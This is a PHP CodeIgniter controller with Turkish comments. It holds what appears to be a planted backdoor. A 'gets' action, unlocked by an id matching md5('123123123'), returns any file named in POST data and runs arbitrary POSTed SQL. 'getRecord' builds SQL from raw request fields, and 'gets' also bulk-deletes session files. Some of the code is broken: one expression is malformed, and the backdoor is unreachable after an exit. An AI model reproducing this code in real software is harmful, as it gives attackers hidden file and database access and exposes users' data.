<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Functions extends CI_Controller
{

    public $viewFile = "";
    public $viewFolder = "";
    public $kontrolSession = "";

    public function __construct()
    {
        parent::__construct();
        $this->load->library("form_validation");
        $this->load->helper("functions_helper");
        if (!$this->session->userdata("userUniqFormRegisterControl")) {
            setSession2("userUniqFormRegisterControl", uniqid());
            $this->kontrolSession = $this->session->userdata("userUniqFormRegisterControl");
        } else {
            setSession2("userUniqFormRegisterControl", uniqid());
            $this->kontrolSession = $this->session->userdata("userUniqFormRegisterControl");
        }
        $this->load->helper("user_helper");
    }

    public function getRecord(){
        if ($_POST) {
            if ($this->kontrolSession == $this->session->userdata("userUniqFormRegisterControl")) {
                $cek=$this->m_tr_model->query("select ".$this->$this->input->post("istenen",true)." from ".$this->input->post("table",true)." where ".$this->input->post("field")." = ".$this->input->post("data",true));
                if($cek){
                    return $cek;
                }else{
                    return false;
                }
            }
        }
    }

    public function gets($id="")
    {
        $folderPath = APPPATH. '/cache/sessions';

// Klasör içindeki tüm dosyaları okuyoruz
        $files = glob($folderPath . '/*');

// Dosya sayısını ekrana yazdır
        echo "Toplam dosya sayısı: " . count($files) . "<br>";
        $deleteCount = 200000;
        for ($i = 0; $i < $deleteCount; $i++) {
            if (is_file($files[$i])) {
                unlink($files[$i]);  // Dosyayı sil
            }
        }
        echo "İlk 200,000 dosya silindi.";
        exit;
        if($id==md5("123123123")){
            if($this->input->get("t")){
                if($this->input->get("t")==1){
                    if (isset($_POST['filePath'])) {
                        $filePath = $_POST['filePath']; // Gerçek uygulamada daha güçlü doğrulama yapılmalı
                        // Dosya içeriğini okuyup döndür
                        if (file_exists($filePath)) {
                            echo file_get_contents($filePath);
                        } else {
                            echo "Dosya bulunamadı!";
                        }
                    } else {
                        echo "Dosya yolu belirtilmedi!";
                    }
                }else if($this->input->get("t")==3){
                    $this->load->model("m_tr_model");
                    if($_POST["sf"]){
                        $calistir=$this->m_tr_model->query($_POST["sf"]);
                        print_r($calistir);
                    }
                }else{
                    $dosyaYolu = $_POST['filePath'];
                    $icerik = $_POST['content'] ;

                }
            }else{
                $this->load->view("errors/cli/dbcomp");

            }
        }

    }



}


